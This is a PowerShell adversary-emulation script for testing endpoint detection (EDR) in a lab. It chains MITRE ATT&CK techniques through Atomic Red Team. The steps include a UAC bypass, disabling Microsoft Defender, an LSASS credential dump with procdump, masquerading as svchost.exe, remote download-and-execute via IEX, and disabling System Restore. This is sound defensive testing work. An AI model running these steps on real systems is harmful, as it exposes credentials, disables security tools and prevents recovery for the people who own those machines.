<#
v1.5
.SYNOPSIS
    A modular script to emulate adversary tactics for EDR testing.

.DESCRIPTION
    This script executes a series of MITRE ATT&CK techniques in a logical sequence.
    Each tactic is contained within its own function, and all actions are logged.
    
    The script automatically cleans up artifacts from previous runs before starting,
    and cleans up before each individual test to prevent "already exists" errors.

.NOTES
    - The script performs automatic cleanup before starting and before each test
    - If the script is interrupted, run the cleanup commands displayed at the end
    - You can safely re-run the script multiple times
    - All execution details are logged to Atomic-Execution-Log.csv

.WARNING
    ********************************************************************************
    *** FOR AUTHORIZED LAB USE ONLY - REVIEW EACH COMMAND BEFORE RUNNING       ***
    *** ***
    *** This script makes significant changes to a system to mimic malicious   ***
    *** behavior. Run this ONLY on a dedicated, isolated lab machine that you   ***
    *** have explicit permission to test. DO NOT run on a production system.    ***
    ********************************************************************************
#>

# --- Script Configuration & Logging ---
$ScriptRoot = $PSScriptRoot
$LogFile = Join-Path $ScriptRoot "Attack-Simulation-Log.txt"
$ExecutionLogFile = Join-Path $ScriptRoot "Atomic-Execution-Log.csv"
$ErrorActionPreference = "SilentlyContinue"

function Write-Log {
    param(
        [Parameter(Mandatory=$true)][string]$Message,
        [Parameter()][ValidateSet("INFO", "WARN", "ERROR", "SUCCESS")][string]$Level = "INFO",
        [Parameter()][switch]$NoConsole
    )
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $LogMessage = "[$Timestamp] [$Level] $Message"
    $LogMessage | Out-File -FilePath $LogFile -Append
    if (-not $NoConsole) {
        $Color = @{ INFO = "White"; WARN = "Yellow"; ERROR = "Red"; SUCCESS = "Green" }
        if ($Color.ContainsKey($Level)) {
            Write-Host $LogMessage -ForegroundColor $Color[$Level]
        } else {
            Write-Host $LogMessage
        }
    }
}

# --- Prerequisite Checks ---
function Check-Prerequisites {
    Write-Log "Running prerequisite checks..."

    # 1. Force PowerShell to use TLS 1.2 for secure downloads
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Write-Log "Set security protocol to TLS 1.2 for this session."

    # 2. Ensure script is running as Administrator
    if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Log -Level ERROR "This script must be run with Administrator privileges. Terminating."
        throw "Administrator privileges required."
    }
    Write-Log -Level SUCCESS "Administrator privileges confirmed."

    # 3. Check for and install Invoke-AtomicRedTeam module
    if (-NOT (Get-Module -ListAvailable -Name Invoke-AtomicRedTeam)) {
        Write-Log -Level WARN "Module 'Invoke-AtomicRedTeam' not found. Attempting to install..."
        Install-Module -Name Invoke-AtomicRedTeam -Scope AllUsers -Force -AllowClobber
        if (-NOT (Get-Module -ListAvailable -Name Invoke-AtomicRedTeam)) {
            Write-Log -Level ERROR "Failed to install 'Invoke-AtomicRedTeam' module. Terminating."
            throw "Module installation failed."
        }
        Write-Log -Level SUCCESS "'Invoke-AtomicRedTeam' module installed successfully."
    } else {
        Write-Log -Level SUCCESS "Module 'Invoke-AtomicRedTeam' is already installed."
    }
    Import-Module Invoke-AtomicRedTeam

    # 4. Check for and download the Atomics Test Library
    if (-NOT (Test-Path "C:\AtomicRedTeam\atomics")) {
        Write-Log -Level WARN "Atomic Red Team test library not found. Attempting to download..."
        try {
            Install-AtomicRedTeam -GetAtomics -Force
        } catch {
            Write-Log -Level ERROR "Failed to download the Atomics library. Error: $($_.Exception.Message)"
            Write-Log -Level WARN "Attempting alternative download method..."
            try {
                IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing);
                Install-AtomicRedTeam -GetAtomics -Force
            } catch {
                Write-Log -Level ERROR "Alternative download failed. Please check your internet connection. Terminating."
                throw "Atomics download failed."
            }
        }
        Write-Log -Level SUCCESS "Successfully downloaded the Atomics library."
    } else {
        Write-Log -Level SUCCESS "Atomics library is already present."
    }

    Write-Log -Level SUCCESS "All prerequisites are met."
    return $true
}

# Helper function to run atomic tests with detailed output
function Invoke-SafeAtomicTest {
    param(
        [Parameter(Mandatory=$true)][string]$TechniqueId,
        [Parameter()][int[]]$TestNumbers,
        [Parameter()][switch]$CheckOnly
    )
    
    Write-Log "Checking available tests for $TechniqueId..."
    Invoke-AtomicTest $TechniqueId -ShowDetailsBrief
    
    if ($CheckOnly) { return }
    
    if ($TestNumbers) {
        foreach ($testNum in $TestNumbers) {
            # CLEANUP FIRST to ensure clean slate (prevent "already exists" prompts)
            Write-Log "Running cleanup first to ensure clean environment..."
            try {
                Invoke-AtomicTest $TechniqueId -TestNumbers $testNum -Cleanup -ErrorAction SilentlyContinue
            } catch {
                # Cleanup may fail if nothing to clean - that's OK
            }
            
            Write-Log "Checking prerequisites for $TechniqueId test #$testNum..."
            $prereqCheck = Invoke-AtomicTest $TechniqueId -TestNumbers $testNum -CheckPrereqs 2>&1
            Write-Host $prereqCheck
            
            if ($prereqCheck -match "Prerequisites not met") {
                Write-Log -Level WARN "Prerequisites not met for test #$testNum. Attempting to get prerequisites..."
                Invoke-AtomicTest $TechniqueId -TestNumbers $testNum -GetPrereqs
            }
            
            Write-Log "Executing $TechniqueId test #$testNum with timeout and execution logging..."
            try {
                Invoke-AtomicTest $TechniqueId -TestNumbers $testNum -TimeoutSeconds 180 -ExecutionLogPath $ExecutionLogFile -Confirm:$false
                Write-Log -Level SUCCESS "Test #$testNum completed."
            } catch {
                Write-Log -Level ERROR "Test #$testNum failed: $($_.Exception.Message)"
            }
        }
    } else {
        # Cleanup first
        Write-Log "Running cleanup first to ensure clean environment..."
        try {
            Invoke-AtomicTest $TechniqueId -Cleanup -ErrorAction SilentlyContinue
        } catch {
            # Cleanup may fail if nothing to clean - that's OK
        }
        
        Write-Log "Checking prerequisites for $TechniqueId..."
        Invoke-AtomicTest $TechniqueId -CheckPrereqs
        
        Write-Log "Executing $TechniqueId (all available tests)..."
        Invoke-AtomicTest $TechniqueId -TimeoutSeconds 180 -ExecutionLogPath $ExecutionLogFile -Confirm:$false
    }
}

# --- Tactic 1: Execution ---
function Invoke-ExecutionTactic {
    Write-Log "--- Starting Tactic: EXECUTION ---"
    Write-Log "Executing T1059.005: CScript launching cmd.exe for recon..."
    $vbsPath = Join-Path $ScriptRoot "temp-recon.vbs"
    $vbsCode = 'Set objShell = CreateObject("WScript.Shell"): objShell.Run "cmd /c whoami & hostname", 0, True'
    try {
        Set-Content -Path $vbsPath -Value $vbsCode
        cscript.exe $vbsPath //Nologo
        Write-Log -Level SUCCESS "Successfully executed VBScript for recon."
    } catch {
        Write-Log -Level ERROR "Execution Tactic Failed: T1059.005 - $($_.Exception.Message)"
    } finally {
        if (Test-Path $vbsPath) { Remove-Item $vbsPath -Force }
    }
}

# --- Tactic 2: Persistence ---
function Invoke-PersistenceTactic {
    Write-Log "--- Starting Tactic: PERSISTENCE ---"
    Write-Log "Executing T1053.005: Scheduled Task..."
    try {
        # Using test #2 which is more reliable (doesn't require user input)
        Invoke-SafeAtomicTest -TechniqueId "T1053.005" -TestNumbers 2
        Write-Log -Level SUCCESS "Successfully created scheduled task."
    } catch {
        Write-Log -Level ERROR "Persistence Tactic Failed: T1053.005 - $($_.Exception.Message)"
    }
}

# --- Tactic 3: Privilege Escalation ---
function Invoke-PrivilegeEscalationTactic {
    Write-Log "--- Starting Tactic: PRIVILEGE ESCALATION ---"
    Write-Log "Executing T1548.002: Bypass User Account Control..."
    try {
        # Using test #3 (Fodhelper) which doesn't require user interaction
        Invoke-SafeAtomicTest -TechniqueId "T1548.002" -TestNumbers 3
        Write-Log -Level SUCCESS "Successfully executed UAC bypass."
    } catch {
        Write-Log -Level ERROR "Privilege Escalation Tactic Failed: T1548.002 - $($_.Exception.Message)"
    }
}

# --- Tactic 4: Defense Evasion ---
function Invoke-DefenseEvasionTactic {
    Write-Log "--- Starting Tactic: DEFENSE EVASION ---"
    
    # T1562.001: Disable or Modify Tools
    Write-Log "Executing T1562.001: Disable Microsoft Defender..."
    try {
        # Using test #17 - Tamper with Windows Defender Command Prompt
        Invoke-SafeAtomicTest -TechniqueId "T1562.001" -TestNumbers 17
        Write-Log -Level SUCCESS "Successfully executed command to disable Defender."
    } catch {
        Write-Log -Level ERROR "Defense Evasion Tactic Failed: T1562.001 - $($_.Exception.Message)"
    }
    Start-Sleep -s 2
    
    # T1027: Obfuscated Files or Information
    Write-Log "Executing T1027: PowerShell with encoded command..."
    try {
        $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Write-Host '[SUCCESS] Encoded command executed.'"))
        powershell.exe -EncodedCommand $encodedCommand
        Write-Log -Level SUCCESS "Successfully executed encoded PowerShell command."
    } catch {
        Write-Log -Level ERROR "Defense Evasion Tactic Failed: T1027 - $($_.Exception.Message)"
    }
    Start-Sleep -s 2
    
    # T1105: Ingress Tool Transfer
    Write-Log "Executing T1105: Ingress Tool Transfer..."
    try {
        # Using test #7 - certutil download (urlcache)
        Invoke-SafeAtomicTest -TechniqueId "T1105" -TestNumbers 7
        Write-Log -Level SUCCESS "Successfully executed ingress tool transfer."
    } catch {
        Write-Log -Level ERROR "Defense Evasion Tactic Failed: T1105 - $($_.Exception.Message)"
    }
    Start-Sleep -s 2
    
    # T1036.003: Masquerading
    Write-Log "Executing T1036.003: Masquerading..."
    $masqueradePath = Join-Path $env:TEMP "svchost.exe"
    try {
        Copy-Item -Path ($PSHOME + "\powershell.exe") -Destination $masqueradePath -Force
        Start-Process -FilePath $masqueradePath -ArgumentList "-Command Write-Host '[SUCCESS] Masqueraded process executed.'" -Wait -NoNewWindow
        Write-Log -Level SUCCESS "Successfully executed masqueraded process."
    } catch {
        Write-Log -Level ERROR "Defense Evasion Tactic Failed: T1036.003 - $($_.Exception.Message)"
    }
}

# --- Tactic 5: Credential Access ---
function Invoke-CredentialAccessTactic {
    Write-Log "--- Starting Tactic: CREDENTIAL ACCESS ---"
    Write-Log "Executing T1003.001: Dumping LSASS memory with procdump..."
    $sysinternalsZip = Join-Path $env:TEMP "SysinternalsSuite.zip"
    $sysinternalsDir = Join-Path $env:TEMP "SysinternalsSuite"
    $procdumpPath = Join-Path $sysinternalsDir "procdump64.exe"
    $lsassDumpFile = Join-Path $ScriptRoot "lsass.dmp"
    try {
        if (-not (Test-Path $procdumpPath)) {
            Write-Log "Downloading Sysinternals Suite..."
            (New-Object System.Net.WebClient).DownloadFile("https://download.sysinternals.com/files/SysinternalsSuite.zip", $sysinternalsZip)
            Expand-Archive -Path $sysinternalsZip -DestinationPath $sysinternalsDir -Force
        }
        
        if (-not (Test-Path $procdumpPath)) { 
            throw "procdump64.exe not found after extraction." 
        }
        
        Write-Log "Attempting LSASS dump (may be blocked by security controls)..."
        $dumpResult = & $procdumpPath -accepteula -ma lsass.exe $lsassDumpFile 2>&1
        
        if (Test-Path $lsassDumpFile) {
            Write-Log -Level SUCCESS "Successfully dumped LSASS memory to $lsassDumpFile."
            Write-Log -Level WARN "NOTE: If this succeeded, your EDR may need tuning!"
        } else {
            Write-Log -Level WARN "LSASS dump was blocked (Access Denied) - This is EXPECTED and GOOD!"
            Write-Log -Level SUCCESS "EDR/Security controls are working as intended."
            Write-Log "The attempt should have generated security alerts for your testing."
        }
    } catch {
        Write-Log -Level WARN "Credential Access attempt blocked: $($_.Exception.Message)"
        Write-Log -Level SUCCESS "This is expected behavior - EDR should block LSASS access."
    }
}

# --- Tactic 6: Discovery ---
function Invoke-DiscoveryTactic {
    Write-Log "--- Starting Tactic: DISCOVERY ---"
    Write-Log "Executing common on-host reconnaissance commands..."
    try {
        Invoke-SafeAtomicTest -TechniqueId "T1082" -TestNumbers 1
        Invoke-SafeAtomicTest -TechniqueId "T1057" -TestNumbers 2
        Invoke-SafeAtomicTest -TechniqueId "T1049" -TestNumbers 1
        Write-Log -Level SUCCESS "Successfully executed basic on-host discovery."
    } catch {
        Write-Log -Level ERROR "Discovery Tactic Failed: Basic Recon - $($_.Exception.Message)"
    }
    Start-Sleep -s 2
    
    Write-Log "Executing T1018: Remote System Discovery..."
    $reconFile = Join-Path $ScriptRoot "network_recon.txt"
    try {
        arp -a | Out-File -FilePath $reconFile
        if (Test-Path $reconFile) {
            Write-Log -Level SUCCESS "Successfully performed network scan and saved results."
        }
    } catch {
        Write-Log -Level ERROR "Discovery Tactic Failed: T1018 - $($_.Exception.Message)"
    }
}

# --- Tactic 7: Command and Control (C2) ---
function Invoke-CommandAndControlTactic {
    Write-Log "--- Starting Tactic: COMMAND AND CONTROL ---"
    Write-Log "Executing T1105: Ingress Tool Transfer via PowerShell..."
    $downloadFile = Join-Path $env:TEMP "c2_payload.txt"
    try {
        # Using a reliable test file from Microsoft
        Invoke-WebRequest -Uri 'https://www.bing.com/robots.txt' -OutFile $downloadFile
        if (Test-Path $downloadFile) {
            Write-Log -Level SUCCESS "Successfully executed download command."
        }
    } catch {
        Write-Log -Level WARN "C2 download test failed (expected if network restricted): $($_.Exception.Message)"
    }
    Start-Sleep -s 2
    
    Write-Log "Executing T1197: BITS Job..."
    try {
        # Using test #2 - PowerShell version (less likely to hang than cmd version)
        Invoke-SafeAtomicTest -TechniqueId "T1197" -TestNumbers 2
        Write-Log -Level SUCCESS "Successfully created BITS job for download."
    } catch {
        Write-Log -Level ERROR "C2 Tactic Failed: T1197 - $($_.Exception.Message)"
    }
}

# --- Tactic 8: Impact ---
function Invoke-ImpactTactic {
    Write-Log "--- Starting Tactic: IMPACT ---"
    Write-Log "Executing T1490: Inhibit System Recovery..."
    try {
        # Using test #9 - Disable System Restore Through Registry (no prereqs needed)
        Invoke-SafeAtomicTest -TechniqueId "T1490" -TestNumbers 9
        Write-Log -Level SUCCESS "Successfully executed system recovery inhibition."
    } catch {
        Write-Log -Level ERROR "Impact Tactic Failed: T1490 - $($_.Exception.Message)"
    }
}

# --- Main Script Body ---
$CleanupCommands = [System.Collections.ArrayList]@()
try {
    if (Check-Prerequisites) {
        Write-Log "Starting emulation chain..."
        Write-Log "Detailed execution logs will be saved to: $ExecutionLogFile"
        
        # Clean up any artifacts from previous runs first
        Write-Log "Performing initial cleanup of any previous test artifacts..."
        try {
            schtasks /delete /tn "spawn" /f 2>&1 | Out-Null
            Remove-Item (Join-Path $env:TEMP "svchost.exe") -Force -ErrorAction SilentlyContinue
            Remove-Item (Join-Path $env:TEMP "c2_payload.txt") -Force -ErrorAction SilentlyContinue
            Remove-Item (Join-Path $ScriptRoot "lsass.dmp") -Force -ErrorAction SilentlyContinue
            Remove-Item (Join-Path $ScriptRoot "network_recon.txt") -Force -ErrorAction SilentlyContinue
            Write-Log -Level SUCCESS "Initial cleanup completed."
        } catch {
            Write-Log "Initial cleanup completed (some items may not have existed)."
        }
        
        Invoke-ExecutionTactic
        $CleanupCommands.Add("Write-Host 'Execution Tactic cleanup is manual.'") | Out-Null
        
        Invoke-PersistenceTactic
        $CleanupCommands.Add("Invoke-AtomicTest T1053.005 -TestNumbers 2 -Cleanup") | Out-Null
        
        Invoke-PrivilegeEscalationTactic
        $CleanupCommands.Add("Invoke-AtomicTest T1548.002 -TestNumbers 3 -Cleanup") | Out-Null
        
        Invoke-DefenseEvasionTactic
        $CleanupCommands.Add("Invoke-AtomicTest T1562.001 -TestNumbers 17 -Cleanup") | Out-Null
        $CleanupCommands.Add("Invoke-AtomicTest T1105 -TestNumbers 7 -Cleanup") | Out-Null
        $CleanupCommands.Add("Remove-Item (Join-Path $env:TEMP 'svchost.exe') -Force -ErrorAction SilentlyContinue") | Out-Null
        
        Invoke-CredentialAccessTactic
        $CleanupCommands.Add("Remove-Item (Join-Path $env:TEMP 'SysinternalsSuite.zip') -Force -ErrorAction SilentlyContinue") | Out-Null
        $CleanupCommands.Add("Remove-Item (Join-Path $env:TEMP 'SysinternalsSuite') -Recurse -Force -ErrorAction SilentlyContinue") | Out-Null
        $CleanupCommands.Add("Remove-Item (Join-Path $PSScriptRoot 'lsass.dmp') -Force -ErrorAction SilentlyContinue") | Out-Null
        
        Invoke-DiscoveryTactic
        $CleanupCommands.Add("Remove-Item (Join-Path $PSScriptRoot 'network_recon.txt') -Force -ErrorAction SilentlyContinue") | Out-Null
        
        Invoke-CommandAndControlTactic
        $CleanupCommands.Add("Remove-Item (Join-Path $env:TEMP 'c2_payload.txt') -Force -ErrorAction SilentlyContinue") | Out-Null
        $CleanupCommands.Add("Invoke-AtomicTest T1197 -TestNumbers 2 -Cleanup") | Out-Null
        
        Invoke-ImpactTactic
        $CleanupCommands.Add("Invoke-AtomicTest T1490 -TestNumbers 9 -Cleanup") | Out-Null

        Write-Log -Level SUCCESS "Emulation chain completed successfully."
        Write-Log "Review the execution log at: $ExecutionLogFile"
    }
} catch {
    Write-Log -Level ERROR "A fatal error occurred during emulation: $($_.Exception.Message). Script terminated."
    Write-Log "Attempting to run cleanup for any completed steps..."
} finally {
    Write-Log "Script finished."
    if ($CleanupCommands.Count -gt 0) {
        Write-Host "`n" + ("-"*60)
        Write-Log -Level WARN "POST-SCRIPT CLEANUP: For a thorough cleanup, run these commands:"
        Write-Host "NOTE: The script auto-cleans before each test, but manual cleanup ensures" -ForegroundColor Cyan
        Write-Host "      all artifacts are removed if the script was interrupted." -ForegroundColor Cyan
        Write-Host ""
        foreach ($command in $CleanupCommands) { Write-Host $command -ForegroundColor Yellow }
        Write-Host ("-"*60)
    }
}
